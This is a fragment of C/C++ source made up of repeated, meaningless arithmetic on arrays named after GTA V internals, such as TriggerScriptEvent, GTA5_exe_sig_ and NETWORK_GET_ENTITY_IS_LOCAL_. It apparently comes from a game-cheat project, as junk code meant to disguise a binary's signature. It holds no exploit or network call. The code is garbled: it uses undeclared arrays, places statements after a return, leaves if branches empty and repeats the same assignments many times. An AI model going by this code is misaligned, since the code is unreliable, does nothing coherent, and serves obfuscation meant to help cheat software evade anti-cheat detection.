			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			return GetSystemMetrics(SM_CXSCREEN);
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
